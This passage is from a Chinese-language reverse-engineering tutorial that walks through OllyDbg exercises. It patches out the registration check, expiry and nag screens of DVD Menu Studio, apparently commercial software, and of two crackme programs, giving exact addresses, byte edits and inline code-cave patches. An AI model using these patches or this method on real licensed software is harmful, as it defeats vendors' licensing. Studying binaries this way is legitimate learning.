%}\n\n把时间调回去却还是过期了，说明可能在某个注册表或某个文件记录它是否过期的信息。\n\n查了一下壳，是32位下由C++编译的可执行文件。\n\nF3载入OD运行，在程序界面点击`Enter Reg Code`注册。随便输入弹窗错误提示，点确定后，回到OD看还是没有去到retn指令。(之前的程序都会去到retn指令退出函数)\n\n{% asset_img 实验12.2.png 实验12.2 %}\n\n这是因为进入了循环，就是用户可以在这注册窗口输入无数次，不用再次点击`Enter Reg Code`再输入注册序列号。这个程序用的是`SetTimer`和`KillTimer`设置类似于C语言switch语句的循环。\n\n输入好序列号后，先别按ok。回到OD按下Ctrl+N查找API函数`KillTimer`，选中右键->在每个参考上设置断点。再按ok，发现停在了某个`KillTimer`断点处。(严格按照这个步骤来，不然会停在别的`KillTimer`处)\n\n我们停在了4DC1A7地址，在注释窗口看到了很多有用的信息。想要注册成功就必须走到4DC1D4地址处。\n\n```asm\n004DC1A2   .  8B57 1C       mov edx,dword ptr ds:[edi+0x1C]          ;  Case 3 of switch 004DBDA4\n004DC1A5   .  50            push eax                                 ; /TimerID = 0x3\n004DC1A6   .  52            push edx                                 ; |hWnd = 000406E8 ('DVD Menu Studio - [Untitled]',class='Afx:400000:8:10003:0:2e00151')\n004DC1A7   .  FF15 B4575E00 call dword ptr ds:[<&USER32.KillTimer>]  ; \\KillTimer\n004DC1AD   .  6A 00         push 0x0\n004DC1AF   .  6A 00         push 0x0\n004DC1B1   .  68 5C666400   push DVDMenuS.0064665C                   ;  The registration code seems to be not valid.\\nPlease check if you didn't made any mistake.\n004DC1B6   .  E8 919D0D00   call DVDMenuS.005B5F4C\n004DC1BB   .  E9 B7000000   jmp DVDMenuS.004DC277\n004DC1C0   >  83F8 04       cmp eax,0x4\n;从信息窗口可知跳转来自004DC1A0，右键->转到jnz来自004DC1A0就会跳到004DC1A0地址\n004DC1C3   .  75 1E         jnz short DVDMenuS.004DC1E3;不能跳，即eax=4\n004DC1C5   .  50            push eax                                 ; /TimerID = 0x3; Case 4 of switch 004DBDA4\n004DC1C6   .  8B47 1C       mov eax,dword ptr ds:[edi+0x1C]          ; |\n004DC1C9   .  50            push eax                                 ; |hWnd = 00000003\n004DC1CA   .  FF15 B4575E00 call dword ptr ds:[<&USER32.KillTimer>]  ; \\KillTimer\n004DC1D0   .  6A 00         push 0x0\n004DC1D2   .  6A 00         push 0x0\n004DC1D4   .  68 FC656400   push DVDMenuS.006465FC                   ;  Thank you for your support!\\nPlease Exit the Software and start it again to validate the code.\n004DC1D9   .  E8 6E9D0D00   call DVDMenuS.005B5F4C\n004DC1DE   .  E9 94000000   jmp DVDMenuS.004DC277\n004DC1E3   >  83F8 05       cmp eax,0x5\n004DC1E6   .  75 15         jnz short DVDMenuS.004DC1FD\n```\n\n现在就往上翻查看哪个跳转可以跳过case3去到case4。一直跟踪cmp和jnz语句去到switch语句开头。\n\n```asm\n004DBDA4   .  83F8 01       cmp eax,0x1                              ;  Switch (cases 1..B)\n```\n\n在4DBD80和4DBDA4各下断点，运行一下。\n\n```asm\n004DBD80   .  55            push ebp\n004DBD81   .  8BEC          mov ebp,esp\n004DBD83   .  6A FF         push -0x1\n004DBD85   .  68 17B85D00   push DVDMenuS.005DB817                   ;  SE 处理程序安装\n004DBD8A   .  64:A1 0000000>mov eax,dword ptr fs:[0]\n004DBD90   .  50            push eax\n004DBD91   .  64:8925 00000>mov dword ptr fs:[0],esp\n004DBD98   .  81EC 68010000 sub esp,0x168\n004DBD9E   .  8B45 08       mov eax,dword ptr ss:[ebp+0x8];在判断前最后一个给eax赋值的指令\n004DBDA1   .  53            push ebx                                 ;  DVDMenuS.004DBD80\n004DBDA2   .  56            push esi\n004DBDA3   .  57            push edi\n004DBDA4   .  83F8 01       cmp eax,0x1                              ;  Switch (cases 1..B)\n```\n\n那么能改成如下指令吗？不行。\n\n```asm\nmov eax,dword ptr ss:[ebp+0x8]\t=>\tmov eax,4\n```\n\n因为`mov eax,dword ptr ss:[ebp+0x8]`指令占3个字节，而`mov eax,4`占5个字节，会将后面的指令覆盖，可能会出现奇奇怪怪的问题。\n\n方法一：因为4只需一个字节(8bit)就可存放，所以修改al即可。这条指令占2个字节，所以不用担心后面指令被覆盖的问题。\n\n```asm\nmov eax,dword ptr ss:[ebp+0x8]\t=>\tmov al,4\n```\n\n保存文件，就可正常运行，也没有了NAG窗口。为了好看，再将未注册字样用11.1的第2、3种方法(第1种不行)修改成注册即可。\n\n{% asset_img 实验12.3.png 实验12.3 %}\n\n方法二：内嵌补丁\n\n一个程序在内存中需要对齐，所以会出现很多空白处。一般在汇编代码的末尾。\n\n```asm\n005E47C0      00            db 00\n005E47C1      00            db 00\n005E47C2      00            db 00\n005E47C3      00            db 00\n005E47C4      00            db 00\n005E47C5      00            db 00\n005E47C6      00            db 00\n005E47C7      00            db 00\n005E47C8      00            db 00\n005E47C9      00            db 00\n005E47CA      00            db 00\n005E47CB      00            db 00\n005E47CC      00            db 00\n005E47CD      00            db 00\n005E47CE      00            db 00\n005E47CF      00            db 00\n```\n\n我们可以利用这些空白处写入修改指令，在需要这些修改指令的地方修改成无条件跳转指令即可。\n\n这个程序要在004DBD9E地址处修改成跳转指令，去到005E47C0处。由于jmp指令需要5个字节，所以先去空白代码处放置好我们要修改的指令(要修改的mov指令和复制004DBD9E地址后面两条指令)。\n\n```asm\n005E47C0      B8 04000000   mov eax,0x4\n```\n\n选中004DBD9E地址后面两条指令右键->二进制->二进制复制，复制到5E47C0后面。需要两个字节就选中两个字节粘贴。\n\n```asm\n004DBDA1   .  53            push ebx                                 ;  DVDMenuS.004DBD80\n004DBDA2   .  56            push esi\n```\n\n回到004DBD9E处修改成无条件跳转指令，下一条指令的地址为004DBDA3。\n\n```asm\nmov eax,dword ptr ss:[ebp+0x8]\t=>\tjmp 005E47C0\n```\n\n```asm\n004DBD9E     /E9 1D8A1000   jmp DVDMenuS.005E47C0\n004DBDA3   . |57            push edi                                 ;  DVDMenuS.<ModuleEntryPoint>\n```\n\n去到空白代码处再加一条jmp指令回到004DBDA3地址处。\n\n```asm\n005E47C0      B8 04000000   mov eax,0x4\n005E47C5      53            push ebx\n005E47C6      56            push esi                                 ;  DVDMenuS.<ModuleEntryPoint>\n005E47C7    ^ E9 D775EFFF   jmp DVDMenuS.004DBDA3\n```\n\n保存所有修改，试运行，发现一直弹出注册成功弹窗。\n\n{% asset_img 实验12.4.png 实验12.4 %}\n\n将新程序载入OD，在005E47C0处下个断点。F9运行，F8一步步查看代码运行情况，发现一直在switch里循环。\n\n如果每个case都跳转(到case4处将ZF改变)，直到4DC241处停下。看到注释窗口的“ResetToolbars”和“Settings”——循环结束的标志，我们要经过那里，所以4DC244的跳转不让它实现(将ZF改变)，也就是eax要等于0xB，才能结束循环。\n\n```asm\n004DC241   > \\83F8 0B       cmp eax,0xB\n004DC244   .  75 31         jnz short DVDMenuS.004DC277\n004DC246   .  50            push eax                                 ; /TimerID = 0x4; Case B of switch 004DBDA4\n004DC247   .  8B47 1C       mov eax,dword ptr ds:[edi+0x1C]          ; |\n004DC24A   .  50            push eax                                 ; |hWnd = 00000004\n004DC24B   .  FF15 B4575E00 call dword ptr ds:[<&USER32.KillTimer>]  ; \\KillTimer\n004DC251   .  E8 F3570E00   call DVDMenuS.005C1A49\n004DC256   .  8B40 04       mov eax,dword ptr ds:[eax+0x4]\n004DC259   .  6A 00         push 0x0\n004DC25B   .  68 B03C6400   push DVDMenuS.00643CB0                   ;  ASCII \"ResetToolbars\"\n004DC260   .  68 1CF16300   push DVDMenuS.0063F11C                   ;  ASCII \"Settings\"\n004DC265   .  8BC8          mov ecx,eax\n004DC267   .  E8 255C0E00   call DVDMenuS.005C1E91\n004DC26C   .  85C0          test eax,eax\n004DC26E   .  74 07         je short DVDMenuS.004DC277\n004DC270   .  8BCF          mov ecx,edi\n004DC272   .  E8 99190000   call DVDMenuS.004DDC10\n004DC277   >  8BCF          mov ecx,edi                              ;  Default case of switch 004DBDA4\n004DC279   .  E8 51040D00   call DVDMenuS.005AC6CF\n004DC27E   .  8B4D F4       mov ecx,dword ptr ss:[ebp-0xC]\n004DC281   .  5F            pop edi                                  ;  024F8688\n004DC282   .  5E            pop esi                                  ;  024F8688\n004DC283   .  5B            pop ebx                                  ;  024F8688\n004DC284   .  64:890D 00000>mov dword ptr fs:[0],ecx\n004DC28B   .  8BE5          mov esp,ebp\n004DC28D   .  5D            pop ebp                                  ;  024F8688\n004DC28E   .  C2 0400       retn 0x4\n```\n\n又要等于4又要0xB怎么可能呢？从4到0xB之间又没有别的函数能改变eax的值，那干脆直接让eax=0xB。因为这是个验证序列号是否正确的函数，如果不正确会一直循环让你填写序列号，就算正确也会一直提示你序列号正确，不如直接退出函数，跳出验证过程。\n\n```asm\n005E47C0      B8 04000000   mov eax,0xB\n005E47C5      53            push ebx\n005E47C6      56            push esi                                 ;  DVDMenuS.<ModuleEntryPoint>\n005E47C7    ^ E9 D775EFFF   jmp DVDMenuS.004DBDA3\n```\n\n保存文件，运行成功。\n\n那方法一那样的修改为什么就不会执行循环呢？载入用方法一修改的程序，发现它在case等于4时也跳转，但它也绕过了“ResetToolbars”和“Settings”，直接跳到4DC277地址，最后返回。因为没有循环所以也可以不用循环结束标志。\n\n```asm\n004DBD9E   .  8B45 08       mov al,4;eax=0019fc04\n004DC279   .  E8 51040D00   call DVDMenuS.005AC6CF;eax=0\n```\n\n而方法二\n\n```asm\n005E47C0      B8 04000000   mov eax,0x4;eax=00000004\n004DC1C9   .  50            push eax;eax=00160842\n004DC1D0   .  6A 00         push 0x0;eax=00000000\n004DC1D9   .  E8 6E9D0D00   call DVDMenuS.005B5F4C;按F8还是会步入函数\n```\n\nF8：单步步过到下一条指令，如果当前命令是一个函数，则一次执行完这个函数(除非这个函数内部包含断点或发生了异常)。\n\n4dc1d9->5e47c0->进入switch语句->4dc1d9一直循环，所以其实是不能进入case4里面的，因为一进去就不停循环，并且去不了循环结束的标志处。哪里能去到循环结束处？当eax=0xB时。\n\n方法三：调用堆栈\n\n我们发现程序是打开界面再弹出NAG窗口，那直接去掉NAG窗口是不是可以用了呢？\n\nF9运行程序，程序弹出过期NAG窗口，F12暂停，点击K图标查看堆栈。\n\n```asm\n地址       堆栈       函数过程 / 参数                       调用来自                      \t结构\n0019F9B0   74EF8085   win32u.NtUserGetMessage               user32.74EF807F               0019F9EC\n0019F9F0   005B044F   user32.GetMessageA                    DVDMenuS.005B0449             0019F9EC\n0019F9F4   00662858     pMsg = DVDMenuS.00662858\n0019F9F8   00000000     hWnd = NULL\n0019F9FC   00000000     MsgFilterMin = 0x0\n0019FA00   00000000     MsgFilterMax = 0x0\n0019FA0C   005AF0A2   包含DVDMenuS.005B044F                   DVDMenuS.005AF09F\n0019FA30   005ABF2E   DVDMenuS.005AEFC8                     DVDMenuS.005ABF29\n0019FA6C   004DC0D6   ? DVDMenuS.005ABE4D                   DVDMenuS.004DC0D1\n```\n\n因为进入到界面没有进行任何操作，很有可能最后一个就是调用NAG弹窗(不是再倒着往上找)。\n\n双击去到汇编代码处，给它下个断点，重载运行。主界面出来了，但NAG没有出现。所以005ABE4D地址很有可能就是我们要去除的NAG弹窗。F8单步步过断点，发现走不了，原来是NAG窗口出现了，在NAG窗口点exit后，OD执行到下一条指令。可以确定005ABE4D就是调用了NAG窗口。再点运行就退出程序了。\n\n在调用了这个函数的父函数入口处设置断点，也就是004DBD80处下断点。Ctrl+F2重载，F9运行，程序停在4DBD80处，一路F8，遇到第一个jnz跳转未实现，第二个jnz跳转实现，再F9运行，发现又去到了4DBD80处而不是到达NAG窗口，一路F8，这时遇到第一个jnz跳转实现，跳过了刚才第二个jnz，F8去到了NAG窗口处。后面的事情我们都知道啦，不知道给我看上一段话！所以在NAG窗口创建过程中，调用NAG函数的父函数被执行了两次。\n\n```asm\n004DBD80   .  55            push ebp\n004DBD81   .  8BEC          mov ebp,esp\n004DBD83   .  6A FF         push -0x1\n004DBD85   .  68 17B85D00   push DVDMenuS.005DB817                   ;  SE 处理程序安装\n004DBD8A   .  64:A1 0000000>mov eax,dword ptr fs:[0]\n004DBD90   .  50            push eax\n004DBD91   .  64:8925 00000>mov dword ptr fs:[0],esp\n004DBD98   .  81EC 68010000 sub esp,0x168\n004DBD9E      8B45 08       mov eax,dword ptr ss:[ebp+0x8]\n004DBDA1      53            push ebx                                 ;  DVDMenuS.004DBD80\n004DBDA2      56            push esi\n004DBDA3   .  57            push edi\n004DBDA4   .  83F8 01       cmp eax,0x1                              ;  Switch (cases 1..B)\n004DBDA7   .  8BF9          mov edi,ecx\n004DBDA9   .  75 53         jnz short DVDMenuS.004DBDFE;第一次不跳转，第二次跳转\n004DBDAB   .  50            push eax                                 ; /TimerID = 0x1; Case 1 of switch 004DBDA4\n004DBDAC   .  8B47 1C       mov eax,dword ptr ds:[edi+0x1C]          ; |DVDMenuS.00400564\n004DBDAF   .  50            push eax                                 ; |hWnd = 00000001\n004DBDB0   .  FF15 B4575E00 call dword ptr ds:[<&USER32.KillTimer>]  ; \\KillTimer\n004DBDB6   .  E8 8E5C0E00   call DVDMenuS.005C1A49\n004DBDBB   .  8B40 04       mov eax,dword ptr ds:[eax+0x4]\n004DBDBE   .  83B8 64010000>cmp dword ptr ds:[eax+0x164],0x1\n004DBDC5   .  75 1F         jnz short DVDMenuS.004DBDE6;第一次跳转，第二次被跳过\n```\n\n第二次运行状态\n\n```asm\n004DBDFE   > \\83F8 07       cmp eax,0x7\n004DBE01   .  0F85 42020000 jnz DVDMenuS.004DC049;跳转，eax=2\n```\n\n```asm\n004DC049   > \\83F8 02       cmp eax,0x2\n004DC04C   .  0F85 4B010000 jnz DVDMenuS.004DC19D;不跳转\n...\n004DC0D1   .  E8 77FD0C00   call DVDMenuS.005ABE4D;NAG窗口\n```\n\n那怎么修改才能去除NAG窗口呢？因为调用NAG窗口需要执行两次父函数，而第二个jnz跳转实现后经过一系列指令又回到了父函数。那可不可以修改第一个jnz跳转实现，绕过第二个jnz，避免第二次回到父函数呢？\n\n第一次状态，将第一个jnz的ZF改变\n\n```asm\n004DBDFE   > \\83F8 07       cmp eax,0x7\n004DBE01   .  0F85 42020000 jnz DVDMenuS.004DC049;跳转，eax=1\n```\n\n```asm\n004DC049   > \\83F8 02       cmp eax,0x2\n004DC04C   .  0F85 4B010000 jnz DVDMenuS.004DC19D;跳转，eax=1\n```\n\n```asm\n004DC19D   > \\83F8 03       cmp eax,0x3\n004DC1A0   .  75 1E         jnz short DVDMenuS.004DC1C0;跳转\n```\n\n```asm\n004DC1C0   > \\83F8 04       cmp eax,0x4\n004DC1C3   .  75 1E         jnz short DVDMenuS.004DC1E3;跳转\n```\n\n```asm\n004DC1E3   > \\83F8 05       cmp eax,0x5\n004DC1E6   .  75 15         jnz short DVDMenuS.004DC1FD;跳转\n```\n\n```asm\n004DC1FD   > \\83F8 06       cmp eax,0x6\n004DC200   .  75 0D         jnz short DVDMenuS.004DC20F;跳转\n```\n\n```asm\n004DC20F   > \\83F8 0A       cmp eax,0xA\n004DC212   .  75 2D         jnz short DVDMenuS.004DC241;跳转\n```\n\n```asm\n004DC241   > \\83F8 0B       cmp eax,0xB\n004DC244   .  75 31         jnz short DVDMenuS.004DC277;跳转\n```\n\n```asm\n004DC277   > \\8BCF          mov ecx,edi                              ;  Default case of switch 004DBDA4\n004DC279   .  E8 51040D00   call DVDMenuS.005AC6CF\n004DC27E   .  8B4D F4       mov ecx,dword ptr ss:[ebp-0xC]\n004DC281   .  5F            pop edi                                  ;  025D8688\n004DC282   .  5E            pop esi                                  ;  025D8688\n004DC283   .  5B            pop ebx                                  ;  025D8688\n004DC284   .  64:890D 00000>mov dword ptr fs:[0],ecx\n004DC28B   .  8BE5          mov esp,ebp\n004DC28D   .  5D            pop ebp                                  ;  025D8688\n004DC28E   .  C2 0400       retn 0x4\n```\n\n一直循环到父函数开头。即如果修改第一个jnz跳转实现，父函数会形成死循环，不仅不能避免第二次回到父函数还有第三次第N次回到父函数。\n\n那修改第二个jnz为跳转未实现，又会怎样呢？\n\n第一次状态\n\n```asm\n004DBDC5   . /75 1F         jnz short DVDMenuS.004DBDE6;第二个jnz\n004DBDC7   . |8BCF          mov ecx,edi\n004DBDC9   . |E8 621C0000   call DVDMenuS.004DDA30\n004DBDCE   . |8B4F 1C       mov ecx,dword ptr ds:[edi+0x1C]\n004DBDD1   . |6A 00         push 0x0                                 ; /Timerproc = NULL\n004DBDD3   . |68 C8000000   push 0xC8                                ; |Timeout = 200. ms\n004DBDD8   . |6A 07         push 0x7                                 ; |TimerID = 0x7\n004DBDDA   . |51            push ecx                                 ; |hWnd = 0019FBE4\n004DBDDB   . |FF15 B8575E00 call dword ptr ds:[<&USER32.SetTimer>]   ; \\SetTimer\n004DBDE1   . |E9 91040000   jmp DVDMenuS.004DC277\n```\n\n```asm\n004DC277   > \\8BCF          mov ecx,edi                              ;  Default case of switch 004DBDA4\n004DC279   .  E8 51040D00   call DVDMenuS.005AC6CF\n004DC27E   .  8B4D F4       mov ecx,dword ptr ss:[ebp-0xC]\n004DC281   .  5F            pop edi                                  ;  024C8688\n004DC282   .  5E            pop esi                                  ;  024C8688\n004DC283   .  5B            pop ebx                                  ;  024C8688\n004DC284   .  64:890D 00000>mov dword ptr fs:[0],ecx\n004DC28B   .  8BE5          mov esp,ebp\n004DC28D   .  5D            pop ebp                                  ;  024C8688\n004DC28E   .  C2 0400       retn 0x4\n```\n\n第二次去到父函数\n\n```asm\n004DBDA9   .  75 53         jnz short DVDMenuS.004DBDFE;跳转，eax=7\n```\n\n```asm\n004DBDFE   > \\83F8 07       cmp eax,0x7\n004DBE01   .  0F85 42020000 jnz DVDMenuS.004DC049;不跳转\n...\n004DBE4A   .  83F8 01       cmp eax,0x1\n004DBE4D   . /0F85 54010000 jnz DVDMenuS.004DBFA7;跳转，eax=0\n```\n\n```asm\n004DBFA7   > \\8B45 EC       mov eax,dword ptr ss:[ebp-0x14]          ;  DVDMenuS.006508B0\n...\n004DC015   .  E8 16CFFAFF   call DVDMenuS.00488F30;运行到这里卡住，原来是有弹窗\n```\n\n{% asset_img 实验12.5.png 实验12.5 %}\n\n关闭弹窗，执行到下一条指令。F9运行，程序正常使用。\n\n从而我们可知，到NAG窗口不是第二次跳不跳到父函数的问题，关键在于eax的值。eax=2去到NAG窗口，eax=1一直循环，eax=7注册成功。\n\n调用堆栈对程序进行破解和观察，比搜索字符串方式来得高级，养成良好习惯，首先考虑堆栈，迫不得已再搜索字符串。\n\n## 22. 实验十三 ReverseMe.NAGs\n\n{% asset_img 实验13.png 实验13 %}\n\n目标：去掉开始和结束的NAG窗口。\n\n它说点击注册按钮就完成程序的注册，就可以避免结束时弹出的NAG窗口，但开始前的NAG窗口还是在的。所以点击注册也不能达到我们的目标。在help->about要求我们在不使用注册按钮的情况下去掉前后的NAG窗口。\n\n{% asset_img 实验13.1.png 实验13.1 %}\n\n查壳，发现它是由C++编译的32位的可执行文件。\n\n{% asset_img 实验13.2.png 实验13.2 %}\n\nF3载入OD，F9运行，在它弹出第一个NAG窗口后迅速点暂停，查看堆栈。发现有一个“Dialog”字样的函数，对话框，很有可能就是NAG窗口。选中双击“调用来自”那一列，去到汇编代码处下断点。重载运行，指令停在断点处，F8步过，弹出NAG窗口，再F8，NAG窗口消失。可以确定这就是调用第一个NAG窗口处。\n\nF9运行，竟然又回到断点处，F8步过，发现程序界面也是调用这个函数，点击exit后OD执行下条指令。再F9再次回到断点处，F8步过发现结束后的NAG窗口也是调用这个函数。这时再按F9，程序就结束了。\n\n综上所述这个程序共有3个窗口，第1个和第3个是NAG，第2个是程序界面窗口。肯定不能用nop填充，因为主程序也在里面。往上看发现有一个条件跳转，通过验证发现只要在第1次和第3次让它跳转实现就可以绕过NAG窗口。(改ZF验证猜想对错)\n\n```asm\n00420379  |. /74 3F         je short ReverseM.004203BA\n0042037B  |. |8D4C24 4C     lea ecx,dword ptr ss:[esp+0x4C]\n0042037F  |. |89B424 CC3700>mov dword ptr ss:[esp+0x37CC],esi\n00420386  |. |890D F4694400 mov dword ptr ds:[0x4469F4],ecx\n0042038C  |. |8B56 08       mov edx,dword ptr ds:[esi+0x8]\n0042038F  |. |8D4C24 4C     lea ecx,dword ptr ss:[esp+0x4C]\n00420393  |. |899424 A03700>mov dword ptr ss:[esp+0x37A0],edx\n0042039A  |. |E8 C1280100   call <jmp.&MFC42.#CDialog::DoModal_2514>;断点处\n0042039F  |. |8D8424 C83700>lea eax,dword ptr ss:[esp+0x37C8]\n004203A6  |. |8D4C24 20     lea ecx,dword ptr ss:[esp+0x20]\n004203AA  |. |50            push eax\n004203AB  |. |E8 2A270100   call <jmp.&MFC42.#CString::operator=_858>\n004203B0  |. |8B4C24 1C     mov ecx,dword ptr ss:[esp+0x1C]\n004203B4  |. |890D F4694400 mov dword ptr ds:[0x4469F4],ecx\n004203BA  |> \\55            push ebp                                 ; /hMem = 00A00014\n004203BB  |.  FF15 7C804300 call dword ptr ds:[<&KERNEL32.GlobalUnlo>; \\GlobalUnlock\n```\n\n怎么操作？类似于C语言的if语句，如果i==2的话就不跳转，i!=2的话就跳转。只不过是转换成汇编语言来写这个语句。由于我们写入的语句要占很多个字节，不可能直接在je语句里修改，这就要用到inline patch。而jmp语句占5个字节，会把je指令的下一条指令覆盖掉，所以je指令的下一条指令也要写在inline patch里。\n\n那“i”要存到哪里去呢？存到PE结构的数据段里去，因为代码段不允许我们写入。点击M图标，找到00400000地址的那个PE结构，找到.data段双击，在里面找到一大片00的地方，随便找一个字节作为i的存储地址，比如00445ec0。(i的取值为1到3，所以一个字节足够了)\n\n找好了后应该对这个地址进行测试，确定这个地址确实在程序运行过程中没有被使用到。选中00右键->断点->硬件写入->Byte。重载运行，没有停在我们选中的地址处就证实没被使用到。\n\n把反编译窗口的滚动条拉到最下方，在一大片00的地方随便找一处，比如00437d6b，写入if语句的汇编代码。\n\n```asm\n00437D6B      FE05 C05E4400       inc byte ptr ds:[0x445EC0];i+=1\n00437D71      803D C05E4400 02    cmp byte ptr ds:[0x445EC0],0x2;i-2==0?不跳转:跳转\n00437D78    ^ 0F85 3C86FEFF       jnz ReverseM.004203BA\n00437D7E      8D4C24 4C           lea ecx,dword ptr ss:[esp+0x4C];被jmp指令覆盖的指令\n00437D82    ^ E9 F885FEFF         jmp ReverseM.0042037F\n```\n\n```asm\n00420379  |. /74 3F               je short ReverseM.004203BA\n修改为\n00420379     /E9 F27B0100         jmp ReverseM.00437D6B\n```\n\n将所有修改保存，若保存不了试试换写汇编代码的地址。这样就去除完两个NAG窗口了。\n\n## 23. 模态对话框与非模态对话框\n\n对话框就是完成“人机对话”的功能，是程序与用户进行交互的中介，如输入参数、输入文本、退出确认等。\n\n对话框从类型上分为两类：modal对话框和modeless对话框。\n\n它们之间的区别在于是否允许用户在不同窗口间进行切换，模态对话框不允许，而非模态对话框允许。模态对话框由Windows为它内建一个消息循环，而非模态对话框的消息则是通过用户程序中的消息循环派送的。\n\n创建模态对话框是由调用DialogBoxParam函数实现，而非模态对话框调用CreateDialogParam函数实现。\n\n### 23.1 DialogBoxParam函数\n\n```c\nHWND DialogBoxParam(\n    HINSTANCE hInstance,//模板名字，独一无二的数字\n    LPCTSTR IpTemplateName,\n    HWND hWndParent, \n    DLGPROC IPDialogFunc,\n    LPARAM dwlnitParam\n);\n```\n\n### 23.2 CreateDialogParam函数\n\n```c\nHWND CreateDialogParam(\n    HINSTANCE hlnstancem,\n    LPCTSTR IpTemplateName,\n    HWND hWndParent,\n    DLGPROCIpDialogFunc, \n    LPARAM dwlniParam\n);\n```\n\n## 24. 实验十四 Urlegal\n\n{% asset_img 实验14.png 实验14 %}\n\n{% asset_img 实验14.1.png 实验14.1 %}\n\n目标：完成注册，去除NAG窗口。\n\n我们知道，只要我们成功注册，NAG窗口也会随之消失。就用以前的方法也可以破解这个软件。这次用另一种方法破解。\n\nNAG其实是个对话框，而且是模态对话框。将程序拖进exescope查看。\n\n{% asset_img 实验14.2.png 实验14.2 %}\n\n在这个程序可以修改对话框的内容，但这个不是实验的重点。可以知道这个对话框的编号是103，也就是`DialogBoxParam`函数的第一个参数，换成16进制是0x67。将Urlegal载入OD，右键->查找->所有命令，输入命令`push 0x67`弹出R图标，显示这个命令的地址。双击进入反汇编窗口。\n\n```asm\n00401220  /$  55            push ebp\n00401221  |.  8BEC          mov ebp,esp\n00401223  |.  6A FF         push -0x1\n00401225  |.  68 05744100   push Urlegal.00417405                      ;  SE 处理程序安装\n0040122A  |.  64:A1 0000000>mov eax,dword ptr fs:[0]\n00401230  |.  50            push eax\n00401231  |.  64:8925 00000>mov dword ptr fs:[0],esp\n00401238  |.  51            push ecx                                   ;  Urlegal.<ModuleEntryPoint>\n00401239  |.  894D F0       mov [local.4],ecx                          ;  Urlegal.<ModuleEntryPoint>\n0040123C  |.  8B45 08       mov eax,[arg.1]\n0040123F  |.  50            push eax\n00401240  |.  6A 67         push 0x67;句柄103\n00401242  |.  8B4D F0       mov ecx,[local.4]\n00401245  |.  E8 6A570100   call <jmp.&MFC42.#CDialog::CDialog_324>;可知这个就是NAG窗口函数\n;因为函数的参数是从后往前进栈，所以第一个参数是最后进栈的，然后才调用函数\n```\n\n这个函数是不希望进去的，但从入口处到函数执行前却没有跳转指令，那要返回到上一层函数看看。\n\n在00401220地址处下断点，重载运行，在主程序窗口点击关闭按钮(因为NAG窗口是在关闭时出现的)，OD停在断点处。在堆栈窗口可以看到\n\n```asm\n0019ED24   004023C0  返回到 Urlegal.004023C0 来自 Urlegal.00401220\n```\n\n选中右键->反汇编窗口中跟随\n\n```asm\n004023AA  |.  E8 691A0000   call Urlegal.00403E18\n004023AF  |.  85C0          test eax,eax\n004023B1  |. /75 43         jnz short Urlegal.004023F6\n004023B3  |. |6A 00         push 0x0\n004023B5  |. |8D8D 98FEFFFF lea ecx,[local.90]\n004023BB  |. |E8 60EEFFFF   call Urlegal.00401220\n004023C0  |. |C745 FC 00000>mov [local.1],0x0\n004023C7  |. |8D8D 98FEFFFF lea ecx,[local.90]\n004023CD  |. |E8 3A450100   call <jmp.&MFC42.#CDialog::DoModal_2514>\n004023D2  |. |83F8 01       cmp eax,0x1\n004023D5  |. |75 0B         jnz short Urlegal.004023E2\n004023D7  |. |8B8D 94FEFFFF mov ecx,[local.91]\n004023DD  |. |E8 82470100   call <jmp.&MFC42.#CFrameWnd::OnClose_4413>\n004023E2  |> |C745 FC FFFFF>mov [local.1],-0x1\n004023E9  |. |8D8D 98FEFFFF lea ecx,[local.90]\n004023EF  |. |E8 3CF0FFFF   call Urlegal.00401430\n004023F4  |. |EB 0B         jmp short Urlegal.00402401\n004023F6  |> \\8B8D 94FEFFFF mov ecx,[local.91]\n```\n\n004023BB的call指令执行的就是那个没有跳转指令的函数。往上找有一个jnz指令，如果不想NAG窗口出现那就必须要让它跳转实现。jnz上面有test指令和call指令，call指令应该执行的是判断程序是否注册的函数，返回值存给eax。\n\n在004023AA处下断点重载运行，点关闭，OD停在断点处，F7进入函数\n\n```asm\n00403E18  /$  55            push ebp\n00403E19  |.  8BEC          mov ebp,esp\n00403E1B  |.  51            push ecx                                   ;  Urlegal.00422428\t;以上不能修改\n00403E1C  |.  894D FC       mov [local.1],ecx                          ;  Urlegal.00422428\n00403E1F  |.  8B45 FC       mov eax,[local.1]\n00403E22  |.  8B40 2C       mov eax,dword ptr ds:[eax+0x2C]\n00403E25  |.  8BE5          mov esp,ebp\t\t;以下不能修改\n00403E27  |.  5D            pop ebp                                    ;  Urlegal.004023AF\n00403E28  \\.  C3            retn\n```\n\n这个判断过程非常短，很容易看明白。只要将eax修改为1即可。由于`mov eax,1`占5个字节，能修改的指令一行最多占3个字节，可以用inline patch方式修改，也可以选中`mov eax`的那两条进行修改。\n\n```asm\nmov eax,[local.1]\t\t\t\t\t\t=>\t\tmov eax,1\nmov eax,dword ptr ds:[eax+0x2C]\t\t\t\n```\n\n选中两条右键->汇编，修改指令，保存。\n\n{% asset_img 实验14.3.png 实验14.3 %}\n\n发现“Register”已经变成灰色，关闭也没有NAG窗口。\n\n接下来尝试用搜索字符串方式破解。\n\n{% asset_img 实验14.4.png 实验14.4 %}\n\n右键->中文搜索引擎->智能搜索图上字符串，看到关键字符串“Thank you for registering!”，双击进入反汇编窗口。往上找跳转指令\n\n```asm\n00402648  |.  E8 C3050000   call Urlegal.00402C10\t\t\t\t\t  ;  很有可能是关键函数\n0040264D  |.  85C0          test eax,eax                              ;  msctf.779D27BC\n0040264F  |.  75 76         jnz short Urlegal.004026C7\n00402651  |.  8D55 EC       lea edx,[local.5]\n00402654  |.  52            push edx\n00402655  |.  8D45 88       lea eax,[local.30]\n00402658  |.  50            push eax                                  ;  msctf.779D27BC\n00402659  |.  E8 02060000   call Urlegal.00402C60                     ;  很有可能是关键函数\n0040265E  |.  25 FF000000   and eax,0xFF\n00402663  |.  85C0          test eax,eax                              ;  msctf.779D27BC\n00402665  |.  74 60         je short Urlegal.004026C7\n```\n\n004026C7地址是注册失败的地址，这两条跳转指令都会去到注册失败的地方，先看第一个函数，当我们输入注册序列号后，F8往下，发现jnz不跳转，说明第一个函数其实不是关键函数。再F8，发现je跳转，修改ZF，弹窗注册成功，注册也变成了灰色，说明破解成功，也就说明第二个函数是关键函数。尝试用nop修改je指令，可以正常执行。\n\n用这种方法不好的就是每次打开软件都要进行注册。再仔细想想，如果我们是已注册用户，程序就不会进到注册窗口，所以我们要找到这个函数的父函数，让它跳过注册函数。呃啊...没找到...\n\n## 25. 实验十五 movgear\n\n{% asset_img 实验15.png 实验15 %}\n\n目标：去除关闭后的NAG窗口。\n\n与实验十四的实验步骤一样，Resource Hacker跟eyescope实现的功能差不多。\n\n{% asset_img 实验15.1.png 实验15.1 